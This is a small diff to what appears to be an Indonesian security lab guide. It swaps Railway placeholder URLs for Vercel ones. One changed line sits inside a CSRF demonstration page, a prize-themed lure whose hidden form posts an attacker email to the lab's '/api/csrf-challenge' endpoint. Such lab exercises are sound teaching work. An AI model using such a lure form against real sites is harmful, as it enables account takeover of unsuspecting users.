@@ -27,7 +27,7 @@
 ```bash
 # Ganti sesuai deployment kamu!
 export BASE="http://localhost:3000"    # Local development
-# export BASE="https://nama-app.up.railway.app"   # Railway (uncomment & ganti!)
+# export BASE="https://nama-app.vercel.app"       # Vercel (uncomment & ganti!)
 ```
 
 ---
@@ -392,7 +392,7 @@ curl -X POST "$BASE/api/profile" \
 <html>
 <body>
   <h1>🎉 Klik untuk Mendapatkan Hadiah!</h1>
-  <form action="https://NAMA-APP.up.railway.app/api/csrf-challenge" method="POST">
+  <form action="https://NAMA-APP.vercel.app/api/csrf-challenge" method="POST">
     <input type="hidden" name="email" value="dicuri@hacker.com">
     <input type="submit" value="Klik Disini!">
   </form>
